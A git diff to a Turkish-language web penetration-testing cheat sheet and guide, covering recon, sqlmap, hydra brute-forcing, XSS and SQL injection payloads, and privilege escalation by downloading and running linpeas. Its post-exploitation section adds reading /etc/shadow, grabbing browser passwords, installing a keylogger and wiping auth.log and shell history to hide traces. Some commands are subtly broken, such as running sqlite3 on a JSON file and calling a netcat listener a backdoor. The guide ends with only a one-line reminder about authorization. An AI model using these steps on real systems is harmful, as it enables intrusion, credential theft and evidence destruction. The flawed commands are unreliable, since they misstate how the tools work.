@@ -1329,31 +1329,241 @@ nikto -h http://10.10.10.10
 ```
 ---
 
-
-## Diğer
+## Login Sayfası Varsa Bruteforce veya SQL Injection Testi
 ```sh 
+Login Sayfası Varsa Bruteforce veya SQL Injection Testi
+Eğer bir giriş formu (/login, /admin, /user) bulunursa, onu test edebiliriz.
+
+🔹 SQL Injection Testi
+Eğer giriş formu veya URL parametreleri varsa:
+$ sqlmap -u "http://10.10.10.10/login.php?user=admin" --dbs --batch
+# Eğer başarılı olursa, veritabanı adlarını listeleyebiliriz.
 
 ```
 ---
 
-
-## Diğer
+##  SQL Injection Testi (Sqlmap)
 ```sh 
-
+#  SQL Injection Testi (Sqlmap)
+sqlmap -u "http://10.10.10.10/index.php?id=1" --dbs --batch
 ```
 ---
 
 
-## Diğer
+## Hydra ile Brute-Force Denemesi
 ```sh 
+Eğer bir admin paneli veya giriş sayfası bulduysak:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
 
 ```
 ---
 
+## # WordPress Zafiyet Taraması (WPScan)
+```sh 
+# WordPress Zafiyet Taraması (WPScan)
+wpscan --url http://10.10.10.10 --enumerate u
+```
+---
 
-## Diğer
+
+## # XSS (Cross-Site Scripting) Testi
+```sh 
+# XSS (Cross-Site Scripting) Testi
+# Eğer bir giriş kutusu veya URL parametresi varsa, XSS saldırısını deneyebilirsiniz:
+<script>alert('XSS')</script>
+
+```
+---
+
+## Backdoor
+```sh 
+
+# Arka kapı açma
+nc -lvp 4444
+```
+---
+
+
+## Genel Çalışma
 ```sh 
 
 ```
 ---
+### **Linux Üzerinde Web Penetrasyon Testleri Yapma Rehberi (Detaylı Açıklama)**
+
+Web penetrasyon testleri, sistemlerin güvenliğini değerlendirmek, zafiyetleri tespit etmek ve olası saldırılara karşı önlem almak için yapılan testlerdir. **Linux**, bu testleri gerçekleştirmek için en uygun işletim sistemlerinden biridir çünkü birçok güvenlik aracı, açık kaynaklı olması ve esneklik sağlaması nedeniyle Linux ile daha uyumludur.
+
+Bu rehberde, Linux üzerinden **web penetrasyon testlerini baştan sona nasıl gerçekleştirebileceğini**, kullanılan araçları ve teknikleri detaylıca ele alacağız.
+
+---
+
+## **1. Web Penetrasyon Testlerine Giriş**
+Web penetrasyon testleri, genellikle aşağıdaki adımları içerir:
+
+1. **Bilgi Toplama (Reconnaissance)**
+2. **Tarama ve Zafiyet Analizi**
+3. **Saldırı (Exploit) Aşaması**
+4. **Yetkilendirme ve Yetki Yükseltme (Privilege Escalation)**
+5. **Veri Çıkarma ve Raporlama (Post Exploitation & Reporting)**
+
+---
+
+## **2. Kullanılacak Linux Dağıtımları**
+Penetrasyon testleri için en çok kullanılan Linux dağıtımları:
+
+- **Kali Linux** – En yaygın kullanılan penetrasyon testi dağıtımıdır. İçerisinde yüzlerce saldırı aracı bulunmaktadır.
+- **Parrot Security OS** – Kali Linux’a benzer, ancak daha hafif ve daha anonimlik odaklıdır.
+- **BlackArch Linux** – Arch tabanlı olup geniş bir siber güvenlik araçları yelpazesi sunar.
+
+**Alternatif:** Ubuntu veya Debian üzerine gerekli araçları manuel kurarak da testler yapabilirsin.
+
+---
+
+## **3. Bilgi Toplama (Reconnaissance)**
+Bir sistem veya web uygulaması hakkında bilgi toplamak, testin en önemli aşamalarından biridir.
+
+### **3.1 Pasif Bilgi Toplama**
+Pasif bilgi toplama, hedef sistemle doğrudan etkileşime geçmeden yapılan keşif sürecidir.
+
+- **WHOIS Sorgusu:** Alan adı bilgilerini öğrenmek için:
+  ```bash
+  whois hedefsite.com
+  ```
+- **DNS Sorgulamaları:**
+  ```bash
+  nslookup hedefsite.com
+  dig hedefsite.com any
+  ```
+- **Subdomain Tarama:**
+  ```bash
+  sublist3r -d hedefsite.com
+  ```
+
+### **3.2 Aktif Bilgi Toplama**
+Aktif bilgi toplama, hedef sistemle doğrudan etkileşime geçerek daha fazla veri elde etmeyi amaçlar.
+
+- **Nmap ile Port Tarama:**
+  ```bash
+  nmap -sS -A -T4 hedefsite.com
+  ```
+- **Açık Servisleri ve Versiyonları Öğrenme:**
+  ```bash
+  nmap -sV -O hedefsite.com
+  ```
+- **Web Dizini Keşfi (Dirb, Gobuster, ffuf kullanımı):**
+  ```bash
+  dirb http://hedefsite.com
+  gobuster dir -u http://hedefsite.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+  ```
+
+---
+
+## **4. Zafiyet Analizi**
+Hedef sistemde mevcut güvenlik açıklarını bulmak için çeşitli araçlar kullanılır.
+
+### **4.1 OWASP ZAP (GUI & Terminal)**
+OWASP ZAP, web güvenlik taramaları için popüler bir araçtır.
+```bash
+zap.sh -daemon -host 127.0.0.1 -port 8080
+```
+Ardından tarayıcı üzerinden **127.0.0.1:8080** adresine giderek GUI üzerinden kullanabilirsin.
+
+### **4.2 Nikto ile Web Güvenlik Açıkları Tarama**
+```bash
+nikto -h http://hedefsite.com
+```
+Bu komut, web uygulamasındaki zayıflıkları tespit etmek için kullanılır.
+
+### **4.3 SQLMap ile SQL Injection Testi**
+```bash
+sqlmap -u "http://hedefsite.com/index.php?id=1" --dbs
+```
+Bu komut, hedef sitenin **SQL Injection** açığı olup olmadığını kontrol eder.
+
+### **4.4 Burp Suite ile Manuel Testler**
+Burp Suite, web uygulamalarına yönelik saldırılar gerçekleştirmek için kullanılan bir proxy aracıdır.
+
+---
+
+## **5. Saldırı (Exploitation) Aşaması**
+Bu aşamada, keşfedilen zafiyetler üzerinden saldırılar gerçekleştirilir.
+
+### **5.1 XSS (Cross-Site Scripting) Saldırıları**
+```javascript
+<script>alert("XSS Açığı Bulundu!")</script>
+```
+Bu tür komutları giriş alanlarına enjekte ederek **XSS zafiyetlerini** test edebilirsin.
+
+### **5.2 SQL Injection**
+Eğer hedefte bir SQL açığı bulunursa, aşağıdaki gibi girişlere hassas olup olmadığını test edebilirsin:
+```sql
+' OR 1=1 --
+```
+Daha detaylı SQL Injection testleri için **sqlmap** kullanabilirsin.
+
+---
+
+## **6. Yetki Yükseltme (Privilege Escalation)**
+Web sunucusunda root erişimini elde etmek için **privilege escalation** yöntemleri uygulanabilir.
+
+- **LinPEAS ile Linux Privilege Escalation Analizi:**
+  ```bash
+  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+  chmod +x linpeas.sh
+  ./linpeas.sh
+  ```
+
+- **GTFOBins ile SUID Bypass**
+  ```bash
+  find / -perm -4000 2>/dev/null
+  ```
+
+---
+
+## **7. Post-Exploitation & Veri Çıkarma**
+Bu aşamada, hedef sistemden hassas bilgileri çıkarmak için yöntemler uygulanır.
+
+- **Hashdump ile Kullanıcı Şifrelerini Çekme:**
+  ```bash
+  cat /etc/shadow
+  ```
+
+- **Tarayıcı Şifrelerini Çalma (Linux Üzerinde)**
+  ```bash
+  sqlite3 ~/.mozilla/firefox/*.default/logins.json
+  ```
+
+- **Keystroke Logger ile Kullanıcı Bilgilerini İzleme**
+  ```bash
+  sudo apt install logkeys
+  sudo logkeys --start
+  ```
+
+---
+
+## **8. Log Temizleme ve Gizlilik**
+Saldırı sonrası iz bırakmamak için logları temizlemek önemlidir.
+
+```bash
+echo "" > /var/log/auth.log
+history -c
+```
+
+---
+
+## **9. Raporlama ve Sonuçlar**
+Penetrasyon testleri tamamlandıktan sonra detaylı bir rapor hazırlanmalıdır. **Metasploit, Burp Suite ve OWASP ZAP** gibi araçlardan alınan raporlar kullanılabilir.
+
+Örnek bir rapor oluşturmak için:
+```bash
+nmap -oN tarama_sonucu.txt -sS -A -T4 hedefsite.com
+```
+---
+
+## **Sonuç**
+Linux üzerinde web penetrasyon testleri yapmak için güçlü araçlara ve stratejilere sahip olmak büyük bir avantajdır. **Bilgi toplama, tarama, saldırı, yetki yükseltme ve raporlama** aşamalarını takip ederek eksiksiz bir test süreci gerçekleştirebilirsin. Ancak, bu işlemleri **sadece izinli sistemlerde yapman gerektiğini unutma**, aksi takdirde yasal sorunlarla karşılaşabilirsin.
+
+
+
 
